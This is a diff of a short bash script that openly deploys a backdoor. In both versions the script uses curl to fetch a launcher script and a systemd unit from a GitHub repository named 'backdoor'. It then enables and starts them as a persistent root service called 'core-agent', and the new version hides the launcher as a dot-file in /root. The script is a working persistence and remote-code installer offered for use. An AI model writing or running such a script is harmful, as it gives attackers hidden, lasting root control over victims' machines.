@@ -1,15 +1,15 @@
 #!/bin/bash
 
-# Download and set up the backdoor launcher script
-curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/core-launch.sh -o /usr/local/bin/core-launch.sh
-chmod +x /usr/local/bin/core-launch.sh
+# Step 1: Download the backdoor launch script to a hidden file in root
+curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/core-launch.sh > /root/.core-launch
+chmod +x /root/.core-launch
 
-# Download and install the systemd service unit
-curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/core-agent.service -o /etc/systemd/system/core-agent.service
+# Step 2: Download the systemd service definition
+curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/core-agent.service > /etc/systemd/system/core-agent.service
 
-# Reload and enable the service
+# Step 3: Enable and start the service
 systemctl daemon-reload
 systemctl enable core-agent
 systemctl start core-agent
 
-echo "[+] Backdoor deployed and started as system service: core-agent"
+echo "[+] Backdoor deployed and running as system service: core-agent"
